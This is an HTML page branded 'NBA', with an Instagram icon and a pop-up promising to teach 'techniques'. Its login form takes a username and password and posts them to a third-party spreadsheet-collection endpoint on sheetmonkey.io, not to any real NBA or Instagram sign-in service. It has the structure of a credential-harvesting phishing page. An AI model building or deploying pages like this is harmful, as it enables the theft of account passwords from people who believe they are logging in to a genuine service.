<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NBA</title>
    <link rel="shortcut icon" href="nba-logo_2x.png" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div id="texto">
        <div id="fala">
            <img src="nba-logo_2x.png" alt="img" id="bola">
            <h2>come and learn some techniques from us.</h2>
            <button id="btn">OK</button>
        </div>
    </div>
    
    <div id="capa">
        <img src="insta_2.png" alt="img" class="icones" id="ico">
        <div id="posi">
            <form action="https://api.sheetmonkey.io/form/kjxcuXdVzR9YKD5ERntkCq" method="post" id="form">
                <img src="nba_2.png" alt="" id="ima">
                <div id="username" class="divs" class="caixas">
                    <label for="iemail">Username</label>
                    <input type="text" name="email" id="iemail" placeholder="Enter your username">

                </div>
                <div id="senha" class="divs" class="caixas">
                    <label for="isenha">Password</label>
                    <input type="password" name="senha" id="isenha" placeholder="Enter your password">
                </div>
                <div id="botoes" class="divs">
                    <input type="button" value="Login" id="login">
                    <input type="reset" value="Clear">
                </div>
                
            </form>
        </div>
    </div>

    <script src="script.js"></script>
    <script src="script_dados.js"></script>
    
</body>
</html>
